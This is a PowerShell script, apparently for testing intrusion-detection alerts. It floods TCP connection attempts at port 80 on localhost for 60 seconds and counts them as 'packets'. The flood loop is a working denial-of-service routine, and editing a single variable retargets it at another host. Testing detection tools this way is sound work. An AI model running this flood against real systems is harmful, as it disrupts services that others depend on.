# Target IP (localhost for safe testing)
$targetIP = "127.0.0.1"
$targetPort = 80  # Using common HTTP port

Write-Host "Starting DoS simulation test..."
Write-Host "Will attempt to send many packets rapidly..."

# Create a counter for packets sent
$packetsSent = 0
$startTime = Get-Date

# Run for 60 seconds
while ((Get-Date) -le $startTime.AddSeconds(60)) {
    $tcpClient = New-Object System.Net.Sockets.TcpClient
    try {
        # Try to connect
        $result = $tcpClient.BeginConnect($targetIP, $targetPort, $null, $null)
        $success = $result.AsyncWaitHandle.WaitOne(1) # Very short timeout
        
        $packetsSent++
        if ($packetsSent % 100 -eq 0) {
            Write-Host "Sent $packetsSent packets..." -ForegroundColor Yellow
        }
    } catch {
        # Ignore errors
    } finally {
        if ($tcpClient.Connected) {
            $tcpClient.Close()
        }
        $tcpClient.Dispose()
    }
    
    # Minimal delay to not overwhelm the system
    Start-Sleep -Milliseconds 1
}

Write-Host "`nDoS test complete. Sent $packetsSent packets in 60 seconds."
Write-Host "Check your packet capture application for alerts."